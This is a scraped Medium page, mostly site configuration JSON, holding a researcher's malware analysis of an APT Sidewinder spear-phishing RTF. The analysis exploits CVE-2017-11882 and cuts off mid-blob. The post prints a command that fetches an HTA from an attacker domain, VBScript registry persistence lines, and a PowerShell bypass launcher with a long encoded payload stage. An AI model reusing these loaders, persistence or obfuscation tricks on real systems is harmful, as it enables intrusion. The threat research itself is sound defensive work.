8d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"sebdraven.medium.com\"})":null,"postResult({\"id\":\"5bc1a7e7c84c\"})":{"__ref":"Post:5bc1a7e7c84c"}},"LinkedAccounts:11d98531eebe":{"__typename":"LinkedAccounts","mastodon":null,"id":"11d98531eebe"},"Membership:053eb905-f962-4628-8989-2a2e6e40254f":{"__typename":"Membership","tier":"MEMBER","id":"053eb905-f962-4628-8989-2a2e6e40254f"},"User:11d98531eebe":{"__typename":"User","id":"11d98531eebe","linkedAccounts":{"__ref":"LinkedAccounts:11d98531eebe"},"isSuspended":false,"name":"Sebdraven","imageId":"1*ycwwStTvoVxriAE2No5ipQ.jpeg","customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"sebdraven.medium.com"}},"hasSubdomain":true,"username":"sebdraven","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":543,"followingCount":9,"collectionFollowingCount":9},"bio":"Malwarist,Threat Huntist and pythonist \u002F core dev of #yeti\u002F member of @ProjectHoneynet \u002F co-organizer #BotConf \u002F researcher","membership":{"__ref":"Membership:053eb905-f962-4628-8989-2a2e6e40254f"},"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:11d98531eebe-viewerId:lo_2dbf5aa1eba1"},"twitterScreenName":"Sebdraven"},"Paragraph:9376201130db_0":{"__typename":"Paragraph","id":"9376201130db_0","name":"b4a6","type":"H3","href":null,"layout":null,"metadata":null,"text":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_1":{"__typename":"Paragraph","id":"9376201130db_1","name":"73e7","type":"H3","href":null,"layout":null,"metadata":null,"text":"Spear phishing","hasDropCap":true,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_2":{"__typename":"Paragraph","id":"9376201130db_2","name":"a25c","type":"P","href":null,"layout":null,"metadata":null,"text":"I’ve started few days ago an analysis on a RTF following my recent researches.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_3":{"__typename":"Paragraph","id":"9376201130db_3","name":"4ce6","type":"P","href":null,"layout":null,"metadata":null,"text":"I found it this: 892859ea9d86fc441b24222148db52eb33cd106c2ac68eafbe83ab0064215488","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_4":{"__typename":"Paragraph","id":"9376201130db_4","name":"9ab8","type":"P","href":null,"layout":null,"metadata":null,"text":"I execute rtfobj on it and two ole embedded objects malforfed:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*clv0SwElLXu5uycgGlttAA.png":{"__typename":"ImageMetadata","id":"1*clv0SwElLXu5uycgGlttAA.png","originalHeight":247,"originalWidth":1322,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_5":{"__typename":"Paragraph","id":"9376201130db_5","name":"0e14","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*clv0SwElLXu5uycgGlttAA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_6":{"__typename":"Paragraph","id":"9376201130db_6","name":"e410","type":"P","href":null,"layout":null,"metadata":null,"text":"But rtfobj extracts succeffully two raws objects:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*RoH4AT4fAqfiiy4hO3C8DA.png":{"__typename":"ImageMetadata","id":"1*RoH4AT4fAqfiiy4hO3C8DA.png","originalHeight":39,"originalWidth":766,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_7":{"__typename":"Paragraph","id":"9376201130db_7","name":"c18f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*RoH4AT4fAqfiiy4hO3C8DA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_8":{"__typename":"Paragraph","id":"9376201130db_8","name":"6ef7","type":"P","href":null,"layout":null,"metadata":null,"text":"The object 6A2A1 is very interesting:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jg292b2dNzrsJddVxaqeuQ.png":{"__typename":"ImageMetadata","id":"1*jg292b2dNzrsJddVxaqeuQ.png","originalHeight":310,"originalWidth":733,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_9":{"__typename":"Paragraph","id":"9376201130db_9","name":"2e3d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jg292b2dNzrsJddVxaqeuQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_10":{"__typename":"Paragraph","id":"9376201130db_10","name":"bc36","type":"P","href":null,"layout":null,"metadata":null,"text":"and this one:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*irGqF14uiBKgitbGYHGjNg.png":{"__typename":"ImageMetadata","id":"1*irGqF14uiBKgitbGYHGjNg.png","originalHeight":150,"originalWidth":826,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:9376201130db_11":{"__typename":"Paragraph","id":"9376201130db_11","name":"1806","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*irGqF14uiBKgitbGYHGjNg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_12":{"__typename":"Paragraph","id":"9376201130db_12","name":"2cc5","type":"P","href":null,"layout":null,"metadata":null,"text":"In fact, the ole object is a exploit of CVE-2017–11882.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_13":{"__typename":"Paragraph","id":"9376201130db_13","name":"c509","type":"P","href":null,"layout":null,"metadata":null,"text":"The implementation is a bit different than my last article, there is not an object MTF.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_14":{"__typename":"Paragraph","id":"9376201130db_14","name":"6fe4","type":"P","href":null,"layout":null,"metadata":null,"text":"The implementation has many matching with the public exploit: https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":62,"end":113,"href":"https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_15":{"__typename":"Paragraph","id":"9376201130db_15","name":"2bdb","type":"P","href":null,"layout":null,"metadata":null,"text":"The exploitation is the following:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_16":{"__typename":"Paragraph","id":"9376201130db_16","name":"5e00","type":"P","href":null,"layout":null,"metadata":null,"text":"an hta is downloaded here and lauched by msthll.dll.RunHMLApplication.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_17":{"__typename":"Paragraph","id":"9376201130db_17","name":"af13","type":"P","href":null,"layout":null,"metadata":null,"text":"caller.exe hxxp:\u002F\u002Fwww.google.com.d-dns.co\u002Fincludes\u002F686a0ea5\u002F-1\u002F1223\u002Fda897db0\u002Ffinal.hta","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":11,"end":86,"href":"http:\u002F\u002Fwww.google.com.d-dns.co\u002Fincludes\u002F686a0ea5\u002F-1\u002F1223\u002Fda897db0\u002Ffinal.hta","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_18":{"__typename":"Paragraph","id":"9376201130db_18","name":"9584","type":"P","href":null,"layout":null,"metadata":null,"text":"The hta is a mix of powershell, vbscript and javascript.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_19":{"__typename":"Paragraph","id":"9376201130db_19","name":"a5f5","type":"H3","href":null,"layout":null,"metadata":null,"text":"Installation of payload and Persistance","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_20":{"__typename":"Paragraph","id":"9376201130db_20","name":"654b","type":"P","href":null,"layout":null,"metadata":null,"text":"The installation of the payload made by vscript a line 151","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_21":{"__typename":"Paragraph","id":"9376201130db_21","name":"e570","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HK”&”CU\\Softwa”&”re\\Updater\\pa”&”rt3\", bnm, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_22":{"__typename":"Paragraph","id":"9376201130db_22","name":"d378","type":"P","href":null,"layout":null,"metadata":null,"text":"here","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_23":{"__typename":"Paragraph","id":"9376201130db_23","name":"c2d0","type":"P","href":null,"layout":null,"metadata":null,"text":"tst = getProfile(“0”) & “$c=”””&c&”””;$m=”””&m&”””;”& Base64Decode(objWSS.RegRead(“HKEY_CURRENT_USER\\Softwa”&”re\\Updater\\pa”&”rt3\")) & getProfile(“1”)\nobjWSS.run “powershell.exe -ExecutionPolicy Bypass -Command “”” & tst & “”””, 0, true","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_24":{"__typename":"Paragraph","id":"9376201130db_24","name":"55e3","type":"P","href":null,"layout":null,"metadata":null,"text":"and here:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_25":{"__typename":"Paragraph","id":"9376201130db_25","name":"4cc1","type":"P","href":null,"layout":null,"metadata":null,"text":"objWSS.RegWrite “HKCU\\Software\\Updater”, “”\n objWSS.RegWrite “HKCU\\Software\\Updater\\part1”, p1, “REG_SZ”\n objWSS.RegWrite “HKCU\\Software\\Updater\\part2”, p2, “REG_SZ”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_26":{"__typename":"Paragraph","id":"9376201130db_26","name":"b229","type":"P","href":null,"layout":null,"metadata":null,"text":"The registry is used like pivot.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_27":{"__typename":"Paragraph","id":"9376201130db_27","name":"1f87","type":"P","href":null,"layout":null,"metadata":null,"text":"p1, p2 and bnm are three blobs of base64 data.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_28":{"__typename":"Paragraph","id":"9376201130db_28","name":"94f8","type":"P","href":null,"layout":null,"metadata":null,"text":"bdm decoded is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:9376201130db_29":{"__typename":"Paragraph","id":"9376201130db_29","name":"7ba3","type":"BQ","href":null,"layout":null,"metadata":null,"text":"iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“””U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgQ3VycmVudFVzZXIgLUZvcmNlOw0KJEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7DQoNCiRwbmFtZTM2ID0gIjMiICsgIjYwVHIiICsgImF5Ig0KJGJpbkRpciA9IFtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdLCAzNSkpKyAiXCIgKyAiV2luc2V0XENvbmZpZyIgKyAiXCI7DQokYmluID0gIldpbnNldC5leGUiOw0KdHJ5ew0KJGNtZExpbmUgPSAoW2ludF0kYykudG9TdHJpbmcoIjAwMDAwMDAwIikrKFtpbnRdJG0pLnRvU3RyaW5nKCIwMDAwMDAwMCIpOw0KJGNtZExpbmUgPSAkYmluKyAiICIgKyRjbWRMaW5lOw0KfQ0KY2F0Y2h7DQokY21kTGluZSA9ICRiaW47DQp9DQokbGluZSA9IG5ldy1vYmplY3QgYnl0ZVtdIDY0Ow0KJGJ1ZjYgPVtCeXRlW11dICgsMHgyMyAqIDY0KTsNCiRjYnl0ZXMgPSBbc3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkY21kTGluZSk7DQpbYXJyYXldOjpjb3B5KCRjYnl0ZXMsJGxpbmUsJGNieXRlcy5sZW5ndGgpOw0KDQokYmluUGF0aCA9ICRiaW5EaXIgKyAkYmluOw0KJGJpblBhdGhkbGwgPSAkYmluRGlyICsgImNtcGJrMzIuZGxsIjsNCiRkbXliaW5QYXRoID0gJGJpbkRpciArICJjbWRsMzIuZXhlIjsNCiRycGNkbGxwYXRoID0gJGJpbkRpciArICI1NzE0NkM5Ni5kbGwiOw0KJHJ1biA9ICdIS0NVOlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwnOw0KJHN5c3RlbSA9ICdIS0NVOlNvZnR3YXJlXFVwZGF0ZXInOw0KJHJ1bkV4aXN0cyA9IEZhbHNlOw0KJHBuYW1lYXZyID0gImF2IiArICJnbiIgKyAidCI7DQokbXN2YnZtZGxscGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxtc3Zidm02MC5kbGwiDQokY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxzeXN0ZW0zMlxjbWRsMzIuZXhlIg0KDQokcTM2ID0gR2V0LVByb2Nlc3MgJHBuYW1lMzYgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7DQppZigkcTM2KXsNCglleGl0DQp9DQoNCmZ1bmN0aW9uIGRjKCRzKXsNCglzYWwgbiBOZXctT2JqZWN0Ow0KCSRkYXRhID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiSDRzSUFBQUFBQUEiICsgJHMpOw0KCSRtcyA9IG4gU3lzdGVtLklPLk1lbW9yeVN0cmVhbTsNCgkkbXMuV3JpdGUoJGRhdGEsIDAsICRkYXRhLkxlbmd0aCk7DQoJJG1zLlNlZWsoMCwwKSB8IE91dC1OdWxsOw0KCXJldHVybiAobiBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKG4gU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJG1zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7DQp9Ow0KDQpmdW5jdGlvbiB1cGR0KCR0LCAkYil7DQoJKGxzICR0KS5MYXN0V3JpdGVUaW1lID0gIChscyAkYikuTGFzdFdyaXRlVGltZQ0KCShscyAkdCkuQ3JlYXRpb25UaW1lID0gKGxzICRiKS5DcmVhdGlvblRpbWUNCgkobHMgJHQpLkxhc3RBY2Nlc3NUaW1lID0gKGxzICRiKS5MYXN0QWNjZXNzVGltZQ0KfQ0KDQpmdW5jdGlvbiB3YjY0KCRwYXRoLCAkYjY0KXsNCgkkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJUVnEiICsgJGI2NCk7DQoJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCVtpby5maWxlXTo6V3JpdGVBbGxCeXRlcygkcGF0aCwkYnl0ZXMpIHwgT3V0LU51bGw7DQoJdXBkdCAtdCAkcGF0aCAtYiAkY21kbDMycGF0aA0KfQ0KDQpmdW5jdGlvbiBzYigkaCwgJG4gKSB7DQogICAgJGxlbiA9ICRuLmxlbmd0aDsNCiAgICAkbGltaXQgPSAkaC5sZW5ndGggLSAkbGVuOw0KICAgIEZvciggJGkgPSAwOyAgJGkgLWxlICRsaW1pdDsgICRpKysgKSB7DQogICAgICAgICRrID0gMDsNCiAgICAgICAgRm9yKCA7ICAkayAtbHQgJGxlbjsgICRrKysgKSB7DQogICAgICAgICAgICBpZiggJG5bJGtdIC1uZSAkaFskaSska10gKSB7YnJlYWt9Ow0KICAgICAgICB9DQogICAgICAgIGlmKCAkayAtZXEgJGxlbiApe3JldHVybiAkaX07DQogICAgfQ0KICAgIHJldHVybiAtMTsNCn0NCg0KaWYoKFRlc3QtUGF0aCAkZW52OldJTkRJUlxTeXNXT1c2NCkpew0KCSRtc3Zidm1kbGxwYXRoID0gJGVudjpXSU5ESVIgKyAiXFN5c1dPVzY0XG1zdmJ2bTYwLmRsbCINCgkkY21kbDMycGF0aCA9ICRlbnY6V0lORElSICsgIlxTeXNXT1c2NFxjbWRsMzIuZXhlIg0KfQ0KDQp0cnl7DQoJaWYoIShUZXN0LVBhdGggJGJpblBhdGgpKXsNCg0KCQkkYjY0ID0gZGMgLXMgKChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRzeXN0ZW0pLnBhcnQxKTsNCgkJJGJ5dGVzID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiVFZxIiArICRiNjQpOw0KCQkkcm4gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKChHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTExMSkpWzAuLjFdOw0KCQlbYXJyYXldOjpjb3B5KCRybiwwLCRieXRlcywkYnl0ZXMubGVuZ3RoIC0gMiwyKTsNCgkJTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgLVBhdGggJGJpbkRpciB8IE91dC1OdWxsOw0KCQlbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJGJpblBhdGgsJGJ5dGVzKSB8IE91dC1OdWxsOw0KCQl1cGR0IC10ICRiaW5QYXRoIC1iICRjbWRsMzJwYXRoDQoNCgkJJGI2NGRsbCA9IGRjIC1zICgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkc3lzdGVtKS5wYXJ0Mik7DQogICAgICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIlRWcSIgKyAkYjY0ZGxsKTsNCgkJW2FycmF5XTo6Y29weSgkbGluZSwwLCRieXRlcywoc2IgLWggJGJ5dGVzIC1uICRidWY2KSw2NCk7DQoJCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLUZvcmNlIC1QYXRoICRiaW5EaXIgfCBPdXQtTnVsbDsNCgkJW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRiaW5QYXRoZGxsLCRieXRlcykgfCBPdXQtTnVsbDsNCgkJdXBkdCAtdCAkYmluUGF0aGRsbCAtYiAkY21kbDMycGF0aA0KCX0NCg0KCVJlbW92ZS1JdGVtIC1QYXRoICRzeXN0ZW0gfCBPdXQtTnVsbDsNCglSZW1vdmUtSXRlbSAkUFJPRklMRS5DdXJyZW50VXNlckFsbEhvc3RzIHwgT3V0LU51bGw7DQoJTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcnVuIC1OYW1lICJXaW5zb3VuZCIgLVByb3BlcnR5VHlwZSBTdHJpbmcgLVZhbHVlICRkbXliaW5QYXRoIHwgT3V0LU51bGw7DQoJDQoJQ29weS1JdGVtICAkbXN2YnZtZGxscGF0aCAkcnBjZGxscGF0aA0KCXVwZHQgLXQgJHJwY2RsbHBhdGggLWIgJG1zdmJ2bWRsbHBhdGgNCg0KCUNvcHktSXRlbSAkY21kbDMycGF0aCAkZG15YmluUGF0aA0KCXVwZH